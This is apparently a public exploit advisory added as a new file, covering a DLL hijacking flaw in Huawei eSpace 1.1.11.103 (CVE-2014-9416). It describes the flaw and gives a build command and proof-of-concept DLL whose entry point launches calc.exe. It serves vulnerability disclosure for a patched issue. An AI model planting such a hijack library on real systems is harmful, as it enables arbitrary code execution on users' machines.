@@ -1,0 +1,53 @@
+/*
+
+Huawei eSpace Desktop DLL Hijacking Vulnerability
+
+
+Vendor: Huawei Technologies Co., Ltd.
+Product web page: https://www.huawei.com
+Affected version: eSpace 1.1.11.103 (aka eSpace ECS, eSpace Desktop, eSpace Meeting, eSpace UC)
+
+Summary: Create more convenient Enhanced Communications (EC) services for your
+enterprise with this suite of products. Huawei’s EC Suite (ECS) solution combines
+voice, data, video, and service streams, and provides users with easy and secure
+access to their service platform from any device, in any place, at any time. The
+eSpace Meeting allows you to join meetings that support voice, data, and video
+functions using the PC client, the tablet client, or an IP phone, or in a meeting
+room with an MT deployed.
+
+Desc: eSpace suffers from a DLL Hijacking issue. The vulnerability is caused due
+to the application loading libraries (mfc71enu.dll, mfc71loc.dll, tcapi.dll and 
+airpcap.dll) in an insecure manner. This can be exploited to load arbitrary libraries
+by tricking a user into opening a related application file (.html, .jpg, .png)
+located on a remote WebDAV or SMB share.
+
+Tested on: Microsoft Windows 7 Professional
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+
+19.08.2014
+
+Patched version: V200R003C00
+Vuln ID: HWPSIRT-2014-1153 and HWPSIRT-2014-1154
+CVE ID: CVE-2014-9416
+Advisory: https://www.huawei.com/en/psirt/security-advisories/hw-406589
+
+*/
+
+
+// gcc -shared -o mfc71enu.dll exploit.c
+
+#include <windows.h> 
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
+{
+	exec();
+	return 0;
+}
+
+int exec()
+{
+	WinExec("calc.exe" , SW_NORMAL);
+	return 0;
+}
